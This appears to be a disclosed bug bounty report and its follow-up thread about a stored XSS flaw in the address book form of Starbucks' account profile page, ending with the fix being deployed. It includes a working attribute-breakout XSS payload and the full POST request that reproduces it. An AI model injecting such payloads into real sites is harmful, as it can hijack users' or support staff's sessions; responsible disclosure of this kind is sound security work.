title: Stored XSS in Adress Book (starbucks.com/account/profile)

profile.name: Starbucks
profile.about: Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time.

vulnerability_information:
Hello,

I just found a stored XSS in the "Adress book menu" of a user's profile : https://www.starbucks.com/account/profile

# Description :

XSS is happening due to the lack of filtering on the **Address.FirstName** parameter when you POST a new address on the URL : https://www.starbucks.com/account/profile/AddressSave :

{F138388}
{F138390}

Here are the POST Parameters to reproduce the issue:

{F138394}

```
Address.AddressName=bbbbb%22%3E&Address.FirstName=z%22 onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">&Address.LastName=bbbbb%22%3E&Address.Country=US&Address.AddressLine1=bbbbb%22%3E&Address.AddressLine2=aaaa%22%3E&Address.City=aaaa%22%3E&Address.CountrySubdivision=AK&Address.PostalCode=75000&Address.PhoneNumber=9901231093&Address.PhoneExtension=&Address.AddressType=Registration&Address.AddressId=32ecef14-f8af-4b5e-adad-d8d2adc8ddad&Address.VerificationStatus=Override&IsAddress=true&__RequestVerificationToken=MDSbXzmn-5j18ck06PpT7Og05zgwOzgq8FMwiqTXIeUfcfRS-keyp9i_x0VbBaIfvUo7EhzYGMvvzPUc0WG5QqlG_YathJ80lgs-p3PCoyNfdvo_E-XY6JfoC9R4tPir0
```

It was quite tricky to leveraged.
Indeed :
- It looks like no parameter from this request is filtered. However, except **Address.FirstName**, they are printed are inside an HTML tag and you prevented the opening of a new tag by blocking anything with "<." (where the point can be anything of course)
- The maximum length of each field (15 characters) is only checked client-side, though short XSS exists
- That is why my final payload is :

**z" onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">**

Here is the email of my account if you can check by yourself: *██████*

# Risks
I assume that you perfectly know the risks of an XSS. 
This one presents a high/critical risk as my addresses can, I think, be seen in the admin panel. I just have to contact the Customer Support for them to look at my account and trigger the XSS.


#Remediation
I also assume that you know how to correct XSS properly as it looks like it is well done elsewhere on the website.


Best regards,
vulnerability_information_html:
Hello,

I just found a stored XSS in the "Adress book menu" of a user's profile : https://www.starbucks.com/account/profile

Description :

XSS is happening due to the lack of filtering on the Address.FirstName parameter when you POST a new address on the URL : https://www.starbucks.com/account/profile/AddressSave :


Here are the POST Parameters to reproduce the issue:

Address.AddressName=bbbbb%22%3E&Address.FirstName=z%22 onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">&Address.LastName=bbbbb%22%3E&Address.Country=US&Address.AddressLine1=bbbbb%22%3E&Address.AddressLine2=aaaa%22%3E&Address.City=aaaa%22%3E&Address.CountrySubdivision=AK&Address.PostalCode=75000&Address.PhoneNumber=9901231093&Address.PhoneExtension=&Address.AddressType=Registration&Address.AddressId=32ecef14-f8af-4b5e-adad-d8d2adc8ddad&Address.VerificationStatus=Override&IsAddress=true&__RequestVerificationToken=MDSbXzmn-5j18ck06PpT7Og05zgwOzgq8FMwiqTXIeUfcfRS-keyp9i_x0VbBaIfvUo7EhzYGMvvzPUc0WG5QqlG_YathJ80lgs-p3PCoyNfdvo_E-XY6JfoC9R4tPir0

It was quite tricky to leveraged.
Indeed :

  • It looks like no parameter from this request is filtered. However, except Address.FirstName, they are printed are inside an HTML tag and you prevented the opening of a new tag by blocking anything with "<." (where the point can be anything of course)
  • The maximum length of each field (15 characters) is only checked client-side, though short XSS exists
  • That is why my final payload is :

z" onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">

Here is the email of my account if you can check by yourself: ██████

Risks

I assume that you perfectly know the risks of an XSS.
This one presents a high/critical risk as my addresses can, I think, be seen in the admin panel. I just have to contact the Customer Support for them to look at my account and trigger the XSS.

Remediation

I also assume that you know how to correct XSS properly as it looks like it is well done elsewhere on the website.

Best regards,

activities.message:
Hey @myst404 

Thank you for sending this in. We are going to investigate this internally and let you know once we have an update. Thanks again!
activities.markdown_message:
Hey @myst404

Thank you for sending this in. We are going to investigate this internally and let you know once we have an update. Thanks again!

activities.message:
Hello,
Great!

Do you want me to try whether the XSS is triggered on the admin panel?
I can send an inoffensive XSS Hunter (https://xsshunter.com/) payload that will take a screenshot of the page for example.

Thank you again for your quick answer.

Best regards,

activities.message:
Hi @myst404 

This one was borderline for us in terms of eligible vs not.  It lends itself more towards a self-css issue and we call out as ineligible in our policy as `Self-XSS and issues exploitable only through Self-XSS`.  

That said, since there is a stored xss component to this, and we do intend to work with the dev team to resolve it, we have determined it should be eligible.
However, due to the difficulty in a ability to exploit this against anyone but the attacker themselves (self) we have lowered the severity.

Thanks again for the report & we'll be in touch when we have a fix and it's time to re-test.
activities.markdown_message:
Hi @myst404

This one was borderline for us in terms of eligible vs not. It lends itself more towards a self-css issue and we call out as ineligible in our policy as Self-XSS and issues exploitable only through Self-XSS.

That said, since there is a stored xss component to this, and we do intend to work with the dev team to resolve it, we have determined it should be eligible.
However, due to the difficulty in a ability to exploit this against anyone but the attacker themselves (self) we have lowered the severity.

Thanks again for the report & we'll be in touch when we have a fix and it's time to re-test.

Thanks for the bounty! 
I think that the severity of this bug can be High if the XSS pops on the admin panel (and maybe someone already did it).

Do you authorize me to try with an inoffensive payload from XSS Hunter?

Best regards,

activities.message:
Hey @overice,

It looks like you added a WAF so it is no more possible to inject Javascript events (except some events that are not useful in this case).

So I think we can not inject a new XSS, however if an XSS has been injected prior to this patch, it will still trigger.
You can have a look on my test account:

█████


Regards,
activities.markdown_message:

activities.message:
Hi @myst404, 

Thank you for your patience and the additional information you have provided us with while we have been working on your report. I have just received confirmation that this has been replicated to prod and we are working to assess and clean up previously affected accounts. That being said, since this has been resolved against new XSS and we are in the process of cleaning up accounts that may have been affected prior, I am going to close this out as Resolved. 

Once again, I would like to thank you for your participation and we look forward to working with you on future reports. 

Best Regards, 
@overice
activities.markdown_message:

I have just received confirmation that this has been replicated to prod and we are working to assess and clean up previously affected accounts. That being said, since this has been resolved against new XSS and we are in the process of cleaning up accounts that may have been affected prior, I am going to close this out as Resolved.

Once again, I would like to thank you for your participation and we look forward to working with you on future reports.

Best Regards,
@overice
